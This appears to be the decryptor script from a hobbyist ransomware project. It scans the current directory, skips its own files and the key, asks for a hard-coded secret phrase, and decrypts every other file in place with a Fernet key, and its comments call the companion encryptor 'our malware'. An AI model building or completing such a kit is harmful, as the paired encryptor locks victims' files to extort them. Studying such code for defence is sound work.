#starting with importing modules
import os
from cryptography.fernet import Fernet as fnt 
#creating variable to store the file
files=[]
#now we run the for loop to read/scan the present file
for file in os.listdir():
    #because we don't want to encrypt our malware so we filter it out 
    #after creating key variable there is an error and that is it also encrypt the key too so to solve this problem we filter the key variable too
    if file=="encryptify.py" or file=="thekey.key" or file=="datasavior.py":
        continue
    #adding this line so that so dont want to read the folder we only want to read the files
    if os.path.isfile(file):
        files.append(file)
print(files)
#opening the key
with open("thekey.key","rb")as key:
    srtkey=key.read()

#adding secretphrase
secretphrase = "anonymous"
user_phrase=input("enter the secret phrase to decrpt your files \n")
if user_phrase==secretphrase:
    for file in files:
        with open(file,"rb")as thefiles:
            contents=thefiles.read()
        contents_decrypted = fnt(srtkey).decrypt(contents)
        #putting the encrypted content inside the file 
        with open(file,"wb") as thefiles:
            thefiles.write(contents_decrypted)




